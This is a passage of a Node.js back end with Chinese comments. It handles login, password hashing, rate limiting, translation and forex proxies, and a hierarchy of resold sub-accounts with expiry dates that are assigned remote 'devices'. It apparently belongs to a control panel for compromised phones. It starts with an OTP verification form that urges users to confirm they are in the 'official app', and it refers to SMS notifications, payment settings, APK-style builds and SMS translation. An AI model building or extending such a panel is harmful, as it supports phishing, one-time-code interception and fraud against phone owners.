.ht{text-align:center;margin-bottom:22px}.logo{width:56px;height:56px;margin:0 auto 10px;border-radius:14px;background:linear-gradient(135deg,#2a4d8f,#3b6fd4);color:#fff;font-size:26px;font-weight:700;line-height:56px}
h2{font-size:20px;color:#16233c}.ht p{font-size:13px;color:#7a8399;margin-top:4px}
.fg{margin-bottom:14px}.fg label{display:block;font-size:12px;color:#5a6478;margin-bottom:6px}
.fg input{width:100%;height:44px;border:1px solid #d8dee9;border-radius:10px;padding:0 12px;font-size:15px;outline:none}
.fg input:focus{border-color:#3b6fd4;box-shadow:0 0 0 3px rgba(59,111,212,.15)}
.fg.row{display:flex;gap:8px}.fg.row input{flex:1}
button.otp{white-space:nowrap;border:1px solid #3b6fd4;background:#eef4ff;color:#2a4d8f;border-radius:10px;padding:0 12px;font-size:13px}
.btn{width:100%;height:46px;border:none;border-radius:10px;background:linear-gradient(135deg,#2a4d8f,#3b6fd4);color:#fff;font-size:16px;font-weight:600;margin-top:6px}
.btn:disabled{opacity:.6}.ok{color:#fff;font-size:18px;text-align:center;margin-top:40vh}
.tips{font-size:11px;color:#9aa3b5;text-align:center;margin-top:14px}</style></head>
<body><form id="vf">${steps}<p class="tips">请确认您正在官方应用环境中操作</p></form>${script}</body></html>`;
}

// ---------------- 构建记录查询 ----------------
function findBuild(ctx, bid) {
  return gList(ctx.db, 'builds').find(b => String(b.id) === String(bid)) || null;
}

// ---------------- 路由表 ----------------
// handler(req, res, ctx, params, body, query) 返回 true 表示已写响应
const R = [];
const on = (method, pattern, h) => R.push({method, pattern: pattern.split('/').filter(Boolean), h});
const CRUD_STORES = [['sapp', 'sapp'], ['bapp', 'bapp'], ['paystg', 'paystg'], ['notifnoti', 'notifnoti'], ['smsnoti', 'smsnoti']];

function register(ctxRef) {
  const A = (req, res) => {           // auth check：验签 + 账户实时复核（禁用/到期/已删）
    const h = req.headers['authorization'] || '';
    const d = ctxRef.jwtCheck((h.startsWith('Bearer ') ? h.slice(7) : ''));
    if (!d) { ctxRef.bad(res, '未提供令牌', 401); return false; }
    if (d.uid !== 1) {
      let acc = null;
      try { acc = ctxRef.db.prepare('SELECT is_active, expires_at FROM web_accounts WHERE id=?').get(d.uid); } catch (e) {}
      if (!acc || !acc.is_active) { ctxRef.bad(res, '令牌已失效', 401); return false; }
      if (acc.expires_at && String(acc.expires_at).slice(0, 19) < new Date(Date.now() + 8 * 3600e3).toISOString().slice(0, 19)) {
        ctxRef.bad(res, '账户已到期', 403); return false;
      }
    }
    return true;
  };
  // token → 账户信息（uid=1 主管理员；≥100 层级账户）
  const authInfo = req => {
    const h = req.headers['authorization'] || '';
    const d = ctxRef.jwtCheck(h.startsWith('Bearer ') ? h.slice(7) : '');
    return d && d.uid ? {uid: d.uid, usr: d.usr, role: d.role || 'sub'} : null;
  };

  // ---- 层级账户体系（管理员 → 总账户 master → 子账户 sub，设备按 owner_id 分配） ----
  ctxRef.db.exec(`CREATE TABLE IF NOT EXISTS web_accounts(
    id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE NOT NULL, password_hash TEXT NOT NULL,
    role TEXT NOT NULL DEFAULT 'sub', parent_id INTEGER, source TEXT DEFAULT 'web',
    expires_at TEXT, is_active INTEGER DEFAULT 1, note TEXT DEFAULT '',
    created_at TEXT DEFAULT (datetime('now','localtime')))`);
  // 自增从 100 起：uid 1 保留给主管理员，避免层级账户撞号（插 id=99 占位再删，AUTOINCREMENT 记住序列）
  if (!ctxRef.db.prepare('SELECT 1 FROM web_accounts LIMIT 1').get()) {
    try {
      ctxRef.db.prepare(`INSERT INTO web_accounts(id,username,password_hash,role) VALUES(99,'__seq_init__','__x__','sub')`).run();
      ctxRef.db.prepare('DELETE FROM web_accounts WHERE id=99').run();
    } catch {}
  }
  // 口令哈希：scrypt + 16 字节随机盐；兼容旧 sha256('kxw$'+p+'$v1')，校验通过后自动升级
function safeEqStr(a, b) {
  const A = crypto.createHash('sha256').update(String(a)).digest();
  const B = crypto.createHash('sha256').update(String(b)).digest();
  return crypto.timingSafeEqual(A, B);
}
function hashPwdLegacy(p) { return crypto.createHash('sha256').update('kxw$' + String(p) + '$v1').digest('hex'); }
function hashPwd(p) {
  const salt = crypto.randomBytes(16).toString('hex');
  const dk = crypto.scryptSync(String(p), salt, 32).toString('hex');
  return 'scrypt$' + salt + '$' + dk;
}
function verifyPwd(stored, p) {
  const s = String(stored || '');
  if (s.startsWith('scrypt$')) {
    const seg = s.split('$');
    if (seg.length !== 3 || !seg[1] || !seg[2]) return false;
    const calc = crypto.scryptSync(String(p), seg[1], 32).toString('hex');
    return safeEqStr(calc, seg[2]);
  }
  return safeEqStr(hashPwdLegacy(p), s);
}
  const accRow = id => ctxRef.db.prepare('SELECT * FROM web_accounts WHERE id=?').get(id);
  // 账户树（自己+全部后代）
  const accountTree = id => ctxRef.db.prepare(
    `WITH RECURSIVE t AS (SELECT id FROM web_accounts WHERE id=? UNION ALL SELECT w.id FROM web_accounts w JOIN t ON w.parent_id=t.id) SELECT id FROM t`
  ).all(id).map(r => r.id);
  // 我的可见设备 owner_id 集合（null = 不限制=全部）
  const visibleOwners = acc => {
    if (!acc || acc.uid === 1 || acc.role === 'admin') return null;
    return new Set(accountTree(acc.uid));
  };
  // 管理权限：主管理员和 master 可管理下级
  const isManager = acc => !!acc && (acc.uid === 1 || acc.role === 'admin' || acc.role === 'master');
  // ---- 设备归属校验：层级账户只能操作自己树内 owner_id 的设备（横向越权修复核心） ----
  const devOk = (me, devId) => {
    const vo = visibleOwners(me);
    if (!vo) return true;                          // 管理员不限制
    const d = ctxRef.getDevice(String(devId));
    return vo.has(d ? (d.owner_id || 1) : -1);     // 设备不存在 → 拒绝
  };
  const devGuard = (req, res, p) => {              // 设备端点统一守卫：通过返回 me，失败写 403
    const me = authInfo(req);
    if (!devOk(me, p.dev_id)) { ctxRef.bad(res, '无权访问该设备', 403); return null; }
    return me;
  };
  // 我的可见设备 id 集合（null = 全部）：全局数据页按归属过滤
  const myDevIds = me => {
    const vo = visibleOwners(me);
    if (!vo) return null;
    const s = new Set();
    for (const r of ctxRef.db.prepare('SELECT id, data FROM devices').all()) {
      try { const d = JSON.parse(r.data); if (vo.has(d.owner_id || 1)) s.add(String(d.id)); } catch (e) {}
    }
    return s;
  };
  ctxRef.canSee = devOk;                           // server.js WS subscribe 过滤复用
  // 开放代理限流：forex/translate 等无鉴权端点按 IP 限速（前端裸 fetch 无法带 JWT，不能加鉴权）
  const RATE = new Map();                          // ip -> {win, n}
  const rateOk = (req, max) => {
    const k = TRUST_IP(req), now = Date.now();
    const r = RATE.get(k);
    if (!r || now - r.win > 60e3) { RATE.set(k, {win: now, n: 1}); if (RATE.size > 5000) RATE.clear(); return true; }
    return ++r.n <= max;
  };

  // ---- 本地化代理：汇率 / 谷歌翻译由服务端转发（前端不再直连境外 API，国内访问不超时挂起） ----
  const FOREX_CACHE = new Map();          // base -> {at, data}，10 分钟缓存（与前端轮询周期一致）
  on('GET', '/m/forex', async (req, res, ctx, p, b, q) => {
    if (!rateOk(req, 30)) return ctx.bad(res, '请求过于频繁', 429);
    const base = String(q.base || 'USD').toUpperCase().replace(/[^A-Z]/g, '').slice(0, 3) || 'USD';
    const hit = FOREX_CACHE.get(base);
    if (hit && Date.now() - hit.at < 600000) return ctx.json(res, hit.data);
    try {
      const r = await fetch('https://open.er-api.com/v6/latest/' + base, {signal: AbortSignal.timeout(8000)});
      const d = await r.json();
      if (!d || !d.rates) throw new Error('bad forex resp');
      FOREX_CACHE.set(base, {at: Date.now(), data: d});
      return ctx.json(res, d);
    } catch (e) {
      if (hit) return ctx.json(res, hit.data);            // 拉取失败回退旧值
      ctx.bad(res, '汇率服务暂不可用', 502);
    }
  });
  const TR_CACHE = new Map();             // q|sl|tl -> 译文 JSON（短信翻译短句复用率高）
  on('GET', '/m/translate', async (req, res, ctx, p, b, q) => {
    if (!rateOk(req, 60)) return ctx.bad(res, '请求过于频繁', 429);
    const text = String(q.q || '').slice(0, 3000);
    const sl = String(q.sl || 'auto').slice(0, 10), tl = String(q.tl || 'zh-CN').slice(0, 10);
    if (!text) return ctx.bad(res, 'missing q');
    const ck = text.slice(0, 200) + '|' + sl + '|' + tl;
    if (TR_CACHE.has(ck)) { res.writeHead(200, {'Content-Type': 'application/json; charset=utf-8'}); return res.end(TR_CACHE.get(ck)); }
    try {
      const UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'Accept': '*/*'};
      let tText = null, srcLang = sl;
      // 1) 谷歌 dict-chrome-ex 端点（对服务器 IP 宽松；gtx 端点对机房 IP 返回 429），返回 [["译文","检测语言"]]
      try {
        const u = `https://clients5.google.com/translate_a/t?client=dict-chrome-ex&sl=${encodeURIComponent(sl)}&tl=${encodeURIComponent(tl)}&q=${encodeURIComponent(text)}`;
        const r = await fetch(u, {signal: AbortSignal.timeout(6000), headers: UA});
        const d = await r.json();
        if (Array.isArray(d) && Array.isArray(d[0]) && typeof d[0][0] === 'string') { tText = d[0][0]; srcLang = d[0][1] || sl; }
      } catch {}
      // 2) 回退 MyMemory（免费机翻，谷歌不可用时兜底）
      if (tText == null) {
        const u = `https://api.mymemory.translated.net/get?q=${encodeURIComponent(text)}&langpair=${encodeURIComponent((sl === 'auto' ? 'Autodetect' : sl) + '|' + tl)}`;
        const r = await fetch(u, {signal: AbortSignal.timeout(6000)});
        const d = await r.json();
        if (d && d.responseData && d.responseData.translatedText) { tText = d.responseData.translatedText; srcLang = d.responseData.detectedLanguage || sl; }
      }
      if (tText == null) throw new Error('all translate sources failed');
      // 统一包装成 gtx 响应格式（前端只读 r[0][i][0] 拼接）
      const body = JSON.stringify([[[tText, text, null, null, 10]], null, srcLang, null, null, null, 1, null, [[srcLang, null, null, [1], true]]]);
      if (TR_CACHE.size > 500) TR_CACHE.clear();
      TR_CACHE.set(ck, body);
      res.writeHead(200, {'Content-Type': 'application/json; charset=utf-8'});
      res.end(body);
    } catch (e) { ctx.bad(res, '翻译服务暂不可用', 502); }
  });

  // ---- 登录/账户 ----
  const _nv = s => String(s == null ? '' : s).replace(/\s+/g, '').replace(/[\uFF01-\uFF5E]/g, c => String.fromCharCode(c.charCodeAt(0) - 0xFEE0)).toLowerCase();
  // 管理员凭据持久化：改密/改名落 kv，服务重启不还原（原实现只改内存变量）
  // 从 kv 恢复用户名与口令哈希；.admin_init 存在时以它为准（面板改密会同步写这两个地方）
  const credLoad = () => { try {
    const r = ctxRef.db.prepare("SELECT v FROM kv WHERE k='admin_cred'").get();
    if (!r) return;
    const c = JSON.parse(r.v);
    if (c.user) ADMIN_USER = c.user;
    // 有 .admin_init（面板改过密）时，它才是权威来源，避免重启回退到 .env 旧口令
    let initOk = false;
    try {
      const raw = fs.readFileSync(ADMIN_CRED_FILE, 'utf8').trim();
      if (raw) {
        const o = JSON.parse(raw);
        if (o.pass) { ADMIN_PASS = o.pass; initOk = true; }
        if (o.user) ADMIN_USER = o.user;
      }
    } catch (e) {}
    if (!initOk) {
      if (c.pass && !c.pass_hash) ADMIN_PASS = c.pass;
      else if (c.pass_hash && String(c.pass_hash).startsWith('scrypt$')) ADMIN_HASH = c.pass_hash;
    }
  } catch (e) {} };
  const credSave = () => { try { ctxRef.db.prepare("INSERT OR REPLACE INTO kv VALUES('admin_cred',?)").run(j({user: ADMIN_USER, pass_hash: hashPwd(ADMIN_PASS)})); } catch (e) {} };
  credLoad();
  // 登录防爆破：同 IP 15 分钟内密码错 10 次 → 锁 15 分钟（内存计数，重启清零）
  // 锁定键取 XFF 末位（nginx $proxy_add_x_forwarded_for 追加的真实客户端 IP，不可伪造）
  const TRUST_IP = req => { const xf = req.headers['x-forwarded-for']; return xf ? String(xf).split(',').pop().trim() : ((req.socket && req.socket.remoteAddress) || ''); };
  const LOGIN_FAILS = new Map();
  const loginBlocked = ip => { const f = LOGIN_FAILS.get(ip); return !!(f && f.until > Date.now()); };
  const loginFail = ip => {
    const f = LOGIN_FAILS.get(ip) || {n: 0, until: 0};
    if (++f.n >= 10) { f.until = Date.now() + 15 * 60e3; f.n = 0; }
    LOGIN_FAILS.set(ip, f);
    if (LOGIN_FAILS.size > 5000) LOGIN_FAILS.clear();
  };
  on('POST', '/m/login', (req, res, ctx, p, b) => {
    const u = _nv(b.username).replace(/^@/, '');
    const pwRaw = String(b.password == null ? '' : b.password);   // 口令不做归一化：大小写/空格/全角均敏感
    if (loginBlocked(TRUST_IP(req))) return ctx.bad(res, '尝试次数过多，请15分钟后再试', 429);
    const lip = REAL_IP(req);
    const bu = safeStr(b.username) || u;   // 原始用户名安全化（b.username 可能是注入对象）
    const tryLogin = (ok, reason, level) => {
      logAttempt(ctxRef.db, bu, ok, reason, lip);
      if (!ok) loginFail(TRUST_IP(req));
      if (!ok) secLog(ctxRef.db, level || '危险', `${reason}: ${bu}`, bu, lip);
      return ok;
    };
    // 1) 主管理员（常量）
    const _adminOk = ADMIN_HASH
      ? verifyPwd(ADMIN_HASH, pwRaw)
      : safeEqStr(pwRaw, ADMIN_PASS);
    if (u === _nv(ADMIN_USER).replace(/^@/, '') && _adminOk) {
      tryLogin(true, '登录成功');
      return ctx.json(res, {token: ctx.jwtSign({uid: 1, usr: ADMIN_USER, role: 'admin', exp: Math.floor(Date.now() / 1000) + 86400 * 7, iat: Math.floor(Date.now() / 1000)}), role: 'admin', username: ADMIN_USER});
    }
    // 2) 层级账户（web_accounts）
    const acc2 = ctxRef.db.prepare('SELECT * FROM web_accounts').all().find(a => _nv(a.username) === u);
    // 口令原样比对；旧版本用 hashPwd(_nv(pw)) 落库（被转小写），这里兼容并自动升级
    let _accOk = false, _accLegacy = false;
    if (acc2) {
      _accOk = verifyPwd(acc2.password_hash, pwRaw);
      if (!_accOk) {
        const nv = _nv(pwRaw);
        if (nv !== pwRaw && verifyPwd(acc2.password_hash, nv)) { _accOk = true; _accLegacy = true; }
      }
    }
    if (!acc2 || !_accOk) { tryLogin(false, '用户名或密码错误'); return ctx.bad(res, '用户名或密码错误', 401); }
    if (_accLegacy) {
      try { ctxRef.db.prepare('UPDATE web_accounts SET password_hash=? WHERE id=?').run(hashPwd(pwRaw), acc2.id); } catch (e) {}
    }
    if (!String(acc2.password_hash || '').startsWith('scrypt$')) {
      try { ctxRef.db.prepare('UPDATE web_accounts SET password_hash=? WHERE id=?').run(hashPwd(pwRaw), acc2.id); } catch (e) {}
    }
    if (!acc2.is_active) { tryLogin(false, '账户已禁用', '警告'); return ctx.bad(res, '账户已禁用', 403); }
    if (acc2.expires_at && String(acc2.expires_at).slice(0, 19) < new Date(Date.now() + 8 * 3600e3).toISOString().slice(0, 19)) {
      tryLogin(false, '账户已到期', '警告'); return ctx.bad(res, '账户已到期', 403);
    }
    tryLogin(true, '登录成功');
    ctx.json(res, {token: ctx.jwtSign({uid: acc2.id, usr: acc2.username, role: acc2.role, exp: Math.floor(Date.now() / 1000) + 86400, iat: Math.floor(Date.now() / 1000)}),
      role: acc2.role, username: acc2.username, uid: acc2.id});
  });
  on('POST', '/m/logout', (req, res, ctx) => ctx.okt(res));
  // 当前账户信息（层级体系）
  on('GET', '/m/me', (req, res, ctx) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    if (!me) return ctx.bad(res, '令牌无效', 401);
    if (me.uid === 1) return ctx.ok(res, {id: 1, username: me.usr, role: 'admin', role_cn: '管理员', can_manage: true,
      sub_count: ctxRef.db.prepare('SELECT COUNT(*) n FROM web_accounts').get().n, dev_count: ctxRef.db.prepare('SELECT COUNT(*) n FROM devices').get().n});
    const a = accRow(me.uid);
    if (!a) return ctx.bad(res, '账户不存在', 404);
    const tree = accountTree(a.id), desc = tree.filter(x => x !== a.id);
    const owners = new Set(tree);
    const devs = ctxRef.db.prepare('SELECT data FROM devices').all().map(r => JSON.parse(r.data));
    const mine = devs.filter(d => owners.has(d.owner_id || 1));
    ctx.ok(res, {id: a.id, username: a.username, role: a.role, role_cn: a.role === 'master' ? '总账户' : '子账户',
      parent_id: a.parent_id, can_manage: a.role === 'master', is_active: !!a.is_active, expires_at: a.expires_at,
      sub_count: desc.length, dev_count: mine.length, dev_online: mine.filter(d => d.online).length, created_at: a.created_at});
  });
  // ---- 下级账户管理（sub.php 全功能）----
  on('GET', '/m/sub', (req, res, ctx) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    if (!isManager(me)) return ctx.json(res, {success: true, role: (me || {}).role, can_manage: false, accounts: [], pool_devices: [], masters: []});
    const tree = accountTree(me.uid), desc = me.uid === 1
      ? ctxRef.db.prepare('SELECT id FROM web_accounts').all().map(r => r.id)   // 管理员：全部账户
      : tree.filter(x => x !== me.uid);
    const names = {1: ADMIN_USER};
    for (const a of ctxRef.db.prepare('SELECT id,username FROM web_accounts').all()) names[a.id] = a.username;
    const allDevs = ctxRef.db.prepare('SELECT data FROM devices').all().map(r => JSON.parse(r.data));
    const devOwnerCnt = {};   // owner_id -> {total, online}
    for (const d of allDevs) { const k = d.owner_id || 1; (devOwnerCnt[k] = devOwnerCnt[k] || {t: 0, o: 0}); devOwnerCnt[k].t++; if (d.online) devOwnerCnt[k].o++; }
    const inQ = desc.length ? ('(' + desc.join(',') + ')') : '(0)';
    const accounts = ctxRef.db.prepare(`SELECT * FROM web_accounts WHERE id IN ${inQ} ORDER BY id`).all().map(a => ({
      id: a.id, username: a.username, role: a.role, role_cn: a.role === 'master' ? '总账户' : '子账户',
      parent_id: a.parent_id, parent_username: names[a.parent_id] || null, is_active: !!a.is_active,
      expires_at: a.expires_at, created_at: a.created_at, note: a.note,
      sub_count: accountTree(a.id).length - 1, dev_count: (devOwnerCnt[a.id] || {t: 0}).t, dev_online: (devOwnerCnt[a.id] || {o: 0}).o}));
    // 设备池（管理员=全部未分配+自己的；总账户=自己池）+ 可选上级（建子账户时）
    const pool = allDevs.filter(d => me.uid === 1 ? (d.owner_id || 1) === 1 : (d.owner_id || 1) === me.uid)
      .map(d => ({id: d.id, model: d.model || d.brand || d.id.slice(-6), online: !!d.online}));
    const masters = me.uid === 1 ? ctxRef.db.prepare("SELECT id,username FROM web_accounts WHERE role='master'").all() : [];
    ctx.ok(res, {success: true, role: me.role, can_manage: true, accounts, pool_devices: pool.slice(0, 500), masters});
  });
  on('POST', '/m/sub', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    if (!isManager(me)) return ctx.bad(res, '无管理权限', 403);
    const action = String(b.action || '');
    const db = ctxRef.db;
    try {
      if (action === 'create') {
        const u = String(b.username || '').trim(), pw = String(b.password || '');
        if (!u || pw.length < 4) return ctx.bad(res, '用户名必填且密码至少4位');
        if (db.prepare('SELECT 1 FROM web_accounts WHERE username=?').get(u) || _nv(u) === _nv(ADMIN_USER)) return ctx.bad(res, '用户名已存在');
        let role = b.role === 'master' ? 'master' : 'sub';
        if (me.uid !== 1 && me.role !== 'admin') role = 'sub';            // 总账户只能建子账户
        const parent = me.uid === 1 ? (b.parent_id ? Number(b.parent_id) : null) : me.uid;
        const r = db.prepare('INSERT INTO web_accounts(username,password_hash,role,parent_id,expires_at,note) VALUES(?,?,?,?,?,?)')
          .run(u, hashPwd(pw), role, parent, b.expires_at || null, String(b.note || '').slice(0, 200));
        secLog(db, '警告', `创建子账户: ${u}(${role})`, me.usr, REAL_IP(req));
        return ctx.ok(res, {id: r.lastInsertRowid, username: u, role});
      }
      const id = Number(b.id || 0), a = accRow(id);
      if (!a) return ctx.bad(res, '账户不存在', 404);
      const myTree = accountTree(me.uid);
      // 管理员（uid=1）可操作全部账户；其他角色仅自己树内（顶级 parent=null 账户不在树里，但归管理员管）
      if (me.uid !== 1 && (!myTree.includes(id) || id === me.uid)) return ctx.bad(res, '只能操作自己的下级', 403);
      if (action === 'delete') {
        const subTree = accountTree(id).filter(x => x !== id);
        if (subTree.length) {
          const q = '(' + subTree.join(',') + ')';
          db.prepare(`DELETE FROM web_accounts WHERE id IN ${q}`).run();          // 级联删下级
          db.prepare('SELECT data FROM devices').all().map(r => JSON.parse(r.data)).forEach(d => { if (subTree.includes(d.owner_id)) { d.owner_id = 1; ctxRef.setDevice(d); } });
        }
        db.prepare('SELECT data FROM devices').all().map(r => JSON.parse(r.data)).forEach(d => { if (d.owner_id === id) { d.owner_id = 1; ctxRef.setDevice(d); } });
        db.prepare('DELETE FROM web_accounts WHERE id=?').run(id);
        secLog(db, '警告', `删除子账户: ${a.username}`, me.usr, REAL_IP(req));
        return ctx.okt(res);
      }
      if (action === 'setpwd') { db.prepare('UPDATE web_accounts SET password_hash=? WHERE id=?').run(hashPwd(String(b.password || '')), id); secLog(db, '警告', `重置子账户密码: ${a.username}`, me.usr, REAL_IP(req)); return ctx.okt(res); }
      if (action === 'renew') { db.prepare('UPDATE web_accounts SET expires_at=? WHERE id=?').run(b.expires_at || null, id); secLog(db, '信息', `更新子账户有效期: ${a.username}`, me.usr, REAL_IP(req)); return ctx.okt(res); }
      if (action === 'toggle') { db.prepare('UPDATE web_accounts SET is_active=1-is_active WHERE id=?').run(id); secLog(db, '警告', `切换子账户状态: ${a.username}`, me.usr, REAL_IP(req)); return ctx.okt(res); }
      if (action === 'update') { db.prepare('UPDATE web_accounts SET note=?, role=? WHERE id=?').run(String(b.note || '').slice(0, 200), (b.role === 'master' && me.uid === 1) ? 'master' : a.role, id); secLog(db, '信息', `编辑子账户: ${a.username}`, me.usr, REAL_IP(req)); return ctx.okt(res); }
      if (action === 'assign' || action === 'unassign') {
        const devs = Array.isArray(b.devices) ? b.devices.map(String) : [String(b.device || '')].filter(Boolean);
        if (!devs.length) return ctx.bad(res, '请选择设备');
        let n = 0, denied = [];
        for (const dv of devs) {
          // 只能操作自己树内的设备
          if (!devOk(me, dv)) { denied.push(dv); continue; }
          const d = ctxRef.getDevice(dv);
          if (!d) { denied.push(dv); continue; }
          if (action === 'assign') d.owner_id = id; else if (d.owner_id === id) d.owner_id = 1;
          d.owner_username = (d.owner_id === 1 ? ADMIN_USER : (accRow(d.owner_id) || {}).username || '');
          ctxRef.setDevice(d);
          n++;
        }
        if (n) ctx.broadcast({type: 'device_update'});
        secLog(db, '信息', `${action === 'assign' ? '分配' : '回收'}设备 ${n} 台 → ${a.username}`,
               me.usr, REAL_IP(req));
        return ctx.json(res, {ok: true, assigned: n, denied});
      }
      return ctx.bad(res, '未知 action');
    } catch (e) { return ctx.bad(res, '操作失败: ' + String(e).slice(0, 80)); }
  });
  on('POST', '/m/change-password', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    if (me && me.uid !== 1) {   // 层级账户：改自己密码
      const a = accRow(me.uid);
      if (!a) return ctx.bad(res, '账户不存在', 404);
      if (!verifyPwd(a.password_hash, String(b.old_password == null ? '' : b.old_password))) return ctx.bad(res, '旧密码错误');
      ctxRef.db.prepare('UPDATE web_accounts SET password_hash=? WHERE id=?').run(hashPwd(String(b.new_password == null ? '' : b.new_password)), me.uid);
      secLog(ctxRef.db, '警告', '修改登录密码', a.username, REAL_IP(req));
      return ctx.okt(res);
    }
    if (safeEqStr(String(b.old_password == null ? '' : b.old_password), ADMIN_PASS)) {
      const np = String(b.new_password == null ? '' : b.new_password);
      if (np) { ADMIN_PASS = np; ADMIN_HASH = ''; credSave(); adminCredPersist(); }
      secLog(ctxRef.db, '危险', '修改主管理员密码', ADMIN_USER, REAL_IP(req));
      return ctx.okt(res);
    }
    return ctx.bad(res, '旧密码错误');
  });
  on('PUT', '/m/self/username', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    // 仅主管理员可改登录用户名（原实现任何登录账户都能改）
    const me = authInfo(req);
    if (!me || me.uid !== 1) return ctx.bad(res, '仅主管理员可修改', 403);
    if (b.username) { ADMIN_USER = b.username; credSave(); adminCredPersist(); secLog(ctxRef.db, '警告', `修改登录用户名: ${b.username}`, b.username, REAL_IP(req)); }
    ctx.okt(res);
  });
  on('GET', '/m/users', (req, res, ctx) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    // 用户设置页兼容：主管理员返回主账户+全部层级账户；其他角色仅自己
    const rows = [{id: 1, username: ADMIN_USER, role: 'admin', role_cn: '管理员', status: 'active', parent_id: null, created_at: '2026-09-01 00:00:00', last_login: nowStr()}];
    if (me && (me.uid === 1 || me.role === 'admin')) {
      for (const a of ctxRef.db.prepare('SELECT * FROM web_accounts ORDER BY id').all())
        rows.push({id: a.id, username: a.username, role: a.role, role_cn: a.role === 'master' ? '总账户' : '子账户',
          status: a.is_active ? 'active' : 'disabled', parent_id: a.parent_id, expires_at: a.expires_at, note: a.note, created_at: a.created_at});
    } else if (me) {
      const a = accRow(me.uid);
      if (a) rows.push({id: a.id, username: a.username, role: a.role, role_cn: a.role === 'master' ? '总账户' : '子账户',
        status: a.is_active ? 'active' : 'disabled', parent_id: a.parent_id, expires_at: a.expires_at, note: a.note, created_at: a.created_at});
    }
    ctx.ok(res, rows);
  });
  // ---- 子账户 CRUD（web_accounts 表：GET /m/users 列表与登录鉴权共用此表） ----
  const accCanManage = (me, uid) => !!me && (me.uid === 1 || me.role === 'admin' || accountTree(me.uid).includes(uid));
  const expFromDays = days => days > 0
    ? new Date(Date.now() + days * 864e5 + 8 * 3600e3).toISOString().slice(0, 19).replace('T', ' ')
    : null;
  on('POST', '/m/user', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    if (!isManager(me)) return ctx.bad(res, '无管理权限', 403);
    const u = String(b.username || '').trim(), pw = String(b.password || '');
    if (!u || pw.length < 4) return ctx.bad(res, '用户名必填且密码至少4位');
    if (ctx.db.prepare('SELECT 1 FROM web_accounts WHERE username=?').get(u) || _nv(u) === _nv(ADMIN_USER)) return ctx.bad(res, '用户名已存在');
    const role = (me.uid === 1 && b.role === 'master') ? 'master' : 'sub';
    const parent = me.uid === 1 ? null : me.uid;
    try {
      // 口令原样哈希：_nv 会转小写，用它会和登录时的原样比对不一致
      const r = ctx.db.prepare('INSERT INTO web_accounts(username,password_hash,role,parent_id,expires_at,note) VALUES(?,?,?,?,?,?)')
        .run(u, hashPwd(pw), role, parent, expFromDays(Number(b.expire_days || 0)), String(b.note || '').slice(0, 200));
      ctx.ok(res, {ok: true, id: r.lastInsertRowid, username: u});
    } catch (e) { ctx.bad(res, '创建失败: ' + String(e).slice(0, 60)); }
  });
  on('DELETE', '/m/user/:uid', (req, res, ctx, p) => {
    if (!A(req, res)) return;
    const me = authInfo(req), uid = Number(p.uid);
    if (!accCanManage(me, uid) || uid === me.uid) return ctx.bad(res, '只能操作自己的下级', 403);
    const subTree = accountTree(uid).filter(x => x !== uid);
    if (subTree.length) {
      ctx.db.prepare(`DELETE FROM web_accounts WHERE id IN (${subTree.join(',')})`).run();
      for (const d of ctx.db.prepare('SELECT data FROM devices').all().map(r => JSON.parse(r.data)))
        if (subTree.includes(d.owner_id)) { d.owner_id = 1; d.owner_username = ADMIN_USER; ctx.setDevice(d); }
    }
    ctx.db.prepare('DELETE FROM web_accounts WHERE id=?').run(uid);
    for (const d of ctx.db.prepare('SELECT data FROM devices').all().map(r => JSON.parse(r.data)))
      if (d.owner_id === uid) { d.owner_id = 1; d.owner_username = ADMIN_USER; ctx.setDevice(d); }
    ctx.okt(res);
  });
  on('PUT', '/m/user/:uid/username', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const me = authInfo(req), uid = Number(p.uid);
    if (!accCanManage(me, uid)) return ctx.bad(res, '无权限', 403);
    const u = String((b || {}).username || '').trim();
    if (!u) return ctx.bad(res, '用户名必填');
    if (ctx.db.prepare('SELECT 1 FROM web_accounts WHERE username=? AND id<>?').get(u, uid) || _nv(u) === _nv(ADMIN_USER)) return ctx.bad(res, '用户名已存在');
    ctx.db.prepare('UPDATE web_accounts SET username=? WHERE id=?').run(u, uid);
    ctx.okt(res);
  });
  on('PUT', '/m/user/:uid/password', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const me = authInfo(req), uid = Number(p.uid);
    if (!accCanManage(me, uid) && me.uid !== uid) return ctx.bad(res, '无权限', 403);
    const pw = String((b || {}).new_password || (b || {}).password || '');
    if (pw.length < 4) return ctx.bad(res, '密码至少4位');
    ctx.db.prepare('UPDATE web_accounts SET password_hash=? WHERE id=?').run(hashPwd(pw), uid);
    ctx.okt(res);
  });
  on('PUT', '/m/user/:uid/remark', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const me = authInfo(req), uid = Number(p.uid);
    if (!accCanManage(me, uid)) return ctx.bad(res, '无权限', 403);
    ctx.db.prepare('UPDATE web_accounts SET note=? WHERE id=?').run(String((b || {}).remark || '').slice(0, 200), uid);
    ctx.okt(res);
  });
  on('PUT', '/m/user/:uid/expiry', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const me = authInfo(req), uid = Number(p.uid);
    if (!accCanManage(me, uid)) return ctx.bad(res, '无权限', 403);
    const exp = expFromDays(Number((b || {}).expire_days || 0)) || (b || {}).expires_at || null;
    ctx.db.prepare('UPDATE web_accounts SET expires_at=? WHERE id=?').run(exp, uid);
    ctx.okt(res);
  });
  on(['POST', 'PUT'], '/m/user/:uid', (req, res, ctx, p, b) => A(req, res) && ctx.okt(res));   // 兼容旧客户端整行编辑
  on(['POST', 'DELETE'], '/m/user/:uid/unbind-telegram', (req, res, ctx) => A(req, res) && ctx.json(res, (ctx.tg ? ctx.tg.unbind() : {ok: true})));

  // ---- stats ----
  on('GET', '/m/stats', async (req, res, ctx) => { if (A(req, res)) ctx.ok(res, await collectStats(ctx)); });

  // ---- notices ----
  on(['GET', 'POST', 'PUT', 'DELETE'], '/m/notices', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
